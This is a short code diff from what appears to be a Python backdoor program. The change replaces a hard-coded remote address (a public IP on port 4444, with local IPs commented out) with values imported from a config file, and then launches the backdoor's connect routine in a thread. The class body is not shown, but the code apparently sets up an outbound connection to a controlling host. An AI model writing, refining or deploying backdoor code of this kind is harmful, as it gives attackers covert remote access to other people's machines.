@@ -115,9 +115,8 @@ class Backdoor:
 
 
 if __name__ == "__main__":
-	backdoor = Backdoor("172.105.76.139", 4444)
-	# backdoor = Backdoor("192.168.0.108", 4444)
-	# backdoor = Backdoor("192.168.0.192", 4444)
+	from config import IP, PORT
+	backdoor = Backdoor(IP, PORT)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
